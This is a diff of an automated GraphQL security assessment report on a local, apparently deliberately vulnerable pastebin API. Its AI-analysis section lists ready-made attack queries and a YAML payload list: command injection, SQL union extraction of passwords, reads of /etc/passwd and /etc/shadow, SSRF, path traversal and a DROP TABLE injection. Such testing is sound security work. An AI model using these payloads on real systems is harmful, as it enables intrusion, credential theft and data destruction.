@@ -1,7 +1,7 @@
 # GrapeQL Security Assessment Report
 
 ## Target: http://localhost:5013/graphql
-## Date: 2026-02-04 17:18:53
+## Date: 2026-02-08 17:23:38
 
 ## Executive Summary
 
@@ -384,28 +384,99 @@ Applies to:
 ## AI Analysis
 
 ### Executive Summary
-The target presents a severe security risk with multiple critical vulnerabilities that could lead to complete system compromise. The API suffers from widespread command injection vulnerabilities across nearly all input parameters, combined with a SQL injection flaw and exposed introspection capabilities. These vulnerabilities collectively enable attackers to execute arbitrary commands on the server, extract sensitive data, and bypass authentication mechanisms.
+
+The target GraphQL API presents a critical security posture with numerous severe vulnerabilities that enable immediate compromise. Multiple fields across queries and mutations are vulnerable to command injection attacks, while administrative debugging endpoints are exposed without proper authentication controls. The combination of enabled introspection, weak injection protections, and dangerous system-level operations creates an extremely high-risk environment requiring urgent remediation.
+
+### Schema Analysis
+
+The schema reveals several concerning security anti-patterns that indicate a lack of security-first design. The most alarming discovery is the presence of multiple system administration fields that accept direct user input without apparent sanitization. The `systemDiagnostics` query accepts `username`, `password`, and `cmd` parameters, essentially providing a direct command execution interface. Similarly, `systemDebug` accepts an `arg` parameter that appears to be passed to system-level operations.
+
+The `UserObject` type exposes a non-null `password` field, indicating that password hashes (or worse, plaintext passwords) may be returned in query responses. The `PasteObject` contains sensitive metadata fields like `ipAddr` and `userAgent` that could facilitate user tracking and profiling. The presence of `deleteAllPastes` as a query operation (rather than a mutation) violates GraphQL best practices and suggests potential state-changing side effects in read operations.
+
+Authentication mechanisms appear weak, with the `me` query accepting a raw `token` parameter and the `login` mutation returning both access and refresh tokens. The `importPaste` mutation accepts arbitrary host/path combinations, potentially enabling Server-Side Request Forgery (SSRF) attacks. Several mutations like `uploadPaste` and `importPaste` handle file operations that could be vectors for additional attacks.
 
 ### Risk Analysis
 
-The most critical concern is the extensive command injection vulnerability surface affecting 14 different parameters across queries, mutations, and system diagnostic functions. The `systemDiagnostics` and `systemDebug` operations are particularly dangerous as they appear designed for administrative purposes and accept direct command input. An attacker could chain these command injection vulnerabilities with the SQL injection in `pastes.filter` to first extract database credentials or user information, then escalate to full system access through command execution.
+The command injection vulnerabilities represent an immediate and critical threat, as they appear to affect multiple input fields across both queries and mutations. An attacker could leverage the `systemDiagnostics.cmd` parameter to execute arbitrary commands on the server, potentially achieving full system compromise. The fact that similar injection patterns appear in login fields suggests that even authentication attempts could be weaponized for command execution.
 
-The SQL injection vulnerability in the `pastes.filter` parameter compounds the risk by potentially exposing authentication credentials, user data, or application secrets that could facilitate lateral movement. The presence of URL-encoded POST support creates additional attack vectors for CSRF-based exploitation, allowing attackers to execute these severe vulnerabilities through victim browsers.
+The exposed `systemDiagnostics` and `systemDebug` fields combined with the lack of authentication controls create a perfect storm for privilege escalation. An attacker could use these endpoints to gather system information, modify configurations, or establish persistence mechanisms. The SQL injection vulnerability in `pastes.filter` could be chained with command injection to extract database credentials and escalate access across the entire data layer.
 
-The combination of enabled introspection and field suggestions provides attackers with complete schema visibility, making it trivial to identify and exploit the injection vulnerabilities. The lack of authentication requirements for basic schema queries suggests weak access controls throughout the application.
+The presence of CSRF-enabling URL-encoded POST acceptance, combined with dangerous mutations like `deletePaste` and `deleteAllPastes`, means that attackers could potentially trick authenticated users into performing destructive actions. The unrestricted introspection access provides attackers with a complete attack surface map, making targeted exploitation significantly easier.
 
 ### Recommended Next Steps
 
-1. **Immediate Command Injection Testing**: Manually verify the `systemDiagnostics.cmd` parameter with payloads like `"whoami"`, `"id"`, or `"cat /etc/passwd"` to confirm arbitrary command execution capabilities.
+1. **Immediately test command injection in systemDiagnostics.cmd** using: `query { systemDiagnostics(cmd: "id; whoami; uname -a") }`
+2. **Verify SQL injection in pastes.filter** with: `query { pastes(filter: "' UNION SELECT 1,2,3,4,5,6,7,8--") { id title } }`
+3. **Test unauthorized access to sensitive system operations**: `query { systemHealth systemUpdate }`
+4. **Attempt privilege escalation via deleteAllPastes**: `query { deleteAllPastes }`
+5. **Extract user credentials via password field**: `query { users { id username password } }`
+6. **Test SSRF through importPaste mutation**: `mutation { importPaste(scheme: "http", host: "internal-service", path: "/admin", port: 80) { result } }`
+7. **Verify token-based authentication bypass**: `query { me(token: "invalid_token") { id username } }`
+8. **Test file upload vulnerabilities**: `mutation { uploadPaste(filename: "../../../etc/passwd", content: "malicious") { result } }`
 
-2. **SQL Injection Exploitation**: Test the `pastes.filter` parameter with union-based payloads such as `" UNION SELECT username,password FROM users--"` to extract authentication data.
+### Suggested Additional Payloads
 
-3. **Authentication Bypass Testing**: Attempt to access the `systemDiagnostics` and `systemDebug` operations without authentication to determine if administrative functions are exposed to unauthenticated users.
-
-4. **Privilege Escalation Assessment**: Use confirmed command injection to enumerate system users, running services, and network configuration with commands like `"ps aux"`, `"netstat -tulpn"`, and `"find / -perm -4000 2>/dev/null"`.
-
-5. **Data Exfiltration Testing**: Leverage the SQL injection to map database structure and extract sensitive application data beyond user credentials.
+```yaml
+test_cases:
+  - name: system_command_chain
+    payload: "id && cat /etc/passwd && ps aux"
+    indicators:
+      - "uid="
+      - "root:x:"
+      - "bash"
+      
+  - name: sql_union_user_extract
+    payload: "' UNION SELECT id,username,password,NULL,NULL,NULL,NULL,NULL FROM users--"
+    indicators:
+      - "admin"
+      - "hash"
+      - "bcrypt"
+      
+  - name: nosql_injection_bypass
+    payload: "{\"$regex\": \".*\"}"
+    indicators:
+      - "data"
+      - "users"
+      - "pastes"
+      
+  - name: system_info_gathering
+    payload: "cat /proc/version && env && ls -la /"
+    indicators:
+      - "Linux version"
+      - "PATH="
+      - "total"
+      
+  - name: ssrf_internal_network
+    strategy: mutation_test
+    mutation: "importPaste"
+    args:
+      scheme: "http"
+      host: "127.0.0.1"
+      path: "/admin/config"
+      port: 8080
+    description: "Tests for SSRF against internal services"
+    
+  - name: directory_traversal_upload
+    payload: "../../../../etc/shadow"
+    indicators:
+      - "root:"
+      - "encrypted"
+      - "permission denied"
+      
+  - name: batch_token_enumeration
+    strategy: header_bypass
+    headers:
+      Authorization: "Bearer aaaaaaaaaaaaaaaa"
+    description: "Tests for weak token validation patterns"
+    
+  - name: audit_log_injection
+    payload: "\"; DROP TABLE audits; --"
+    indicators:
+      - "syntax error"
+      - "table"
+      - "permission"
+```
 
 ### Gaps in Coverage
 
-The automated scan may have missed business logic flaws in paste sharing mechanisms, potential file upload vulnerabilities in the `uploadPaste` and `importPaste` mutations, and subscription-based denial of service attacks. Role-based access control weaknesses between different user types should be manually tested, particularly around paste ownership and administrative functions. Additionally, the scan likely did not assess query complexity limits or nested query attacks that could cause resource exhaustion.
+The automated scan may have missed several critical attack vectors specific to this pastebin application. Business logic flaws around paste ownership validation, read-and-burn functionality bypass, and audit log manipulation should be tested manually. The subscription endpoint could be vulnerable to denial-of-service through resource exhaustion or unauthorized data streaming. Field-level authorization between different user roles appears absent from the schema, suggesting horizontal privilege escalation opportunities. Rate limiting effectiveness against batch operations and nested query depth limits should be validated through manual testing. Additionally, the custom DateTime scalar type and UserInput object may contain unmarked injection points that require targeted payload crafting.
